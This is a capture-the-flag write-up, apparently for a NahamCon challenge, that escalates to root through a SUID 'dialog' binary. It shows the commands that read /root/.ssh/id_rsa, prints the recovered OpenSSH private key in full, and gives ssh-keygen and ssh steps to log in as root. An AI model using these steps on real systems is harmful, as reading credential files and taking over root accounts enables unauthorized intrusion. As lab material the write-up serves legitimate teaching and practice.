# Gossip

## Table of Content

<!-- MarkdownTOC -->

- [Find SUID bin](#find-suid-bin)
- [Exploid the SUID](#exploid-the-suid)

<!-- /MarkdownTOC -->

## Find SUID bin

We start by search a SUID binary, with the following command : 

`find / -user root -perm /4000 2>/dev/null`

Then we find `dialog`

## Exploid the SUID

[Dialog GTFO](https://gtfobins.github.io/gtfobins/dialog/#suid)

With some guess and luck, we get the root private key !

`dialog --textbox "/root/.ssh/id_rsa" 0 0`

It's a bit tedious to do the copy/paste manually, but finally get it!

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
4cTOVaH95/MYYZAAAACmpvaG5AeHBzMTU=
-----END OPENSSH PRIVATE KEY-----
```

The trick is that not a RSA private key, but OpenSSH private key.
So, to use it with ssh, we need to transform into RSA.

To do that, we can follow this link : 
[https://stackoverflow.com/questions/54994641/openssh-private-key-to-rsa-private-key](https://stackoverflow.com/questions/54994641/openssh-private-key-to-rsa-private-key)

```sh
puttygen id_openssh -O private-sshcom -o id_ssh
ssh-keygen -i -f id_ssh > id_rsa
chmod 600 id_rsa
ssh -p 30998 -i id_rsa root@challenge.nahamcon.com
```

Then Let's go, we're root !
